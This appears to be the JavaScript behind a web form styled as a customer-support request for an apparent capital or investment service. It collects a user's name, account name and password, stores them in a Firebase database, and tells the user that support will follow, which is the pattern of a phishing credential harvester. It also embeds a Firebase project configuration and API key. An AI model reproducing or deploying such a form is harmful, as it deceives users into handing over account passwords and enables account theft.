
      function save(){
        var name = document.getElementById('name').value
        var accname = document.getElementById('accname').value
        var pass = document.getElementById('pass').value

        database.ref('CONTACTS/' + name).set({
          name : name,
          accname : accname,
          pass : pass
        });
          alert('Sent successfully, Our customer support will be with you shortly');
      }

      // function safe(){
      //   var name = document.getElementById('name').value
      //   var contact = document.getElementById('contact').value
      //   var message = document.getElementById('message').values

      //   database.ref('Wya_Contacts/' + name).set({
      //     name : name,
      //     contact : contact,
      //     message : message
      //   });
      //   alert('Sent successfully');
      // }



var firebaseConfig = {
     apiKey: "AIzaSyA7JXEkqgBYBf2zA_FU7caqwrtKgtnVKyc",

    authDomain: "azupek-capital-cf6a0.firebaseapp.com",

    databaseURL: "https://azupek-capital-cf6a0-default-rtdb.firebaseio.com/", 

    projectId: "azupek-capital-cf6a0",

    storageBucket: "azupek-capital-cf6a0.appspot.com",

    messagingSenderId: "1076032691982",

    appId: "1:1076032691982:web:b973439bca632d9d6e015f",


  };
  
        // Initialize Firebase
      firebase.initializeApp(firebaseConfig);

      var database = firebase.database();

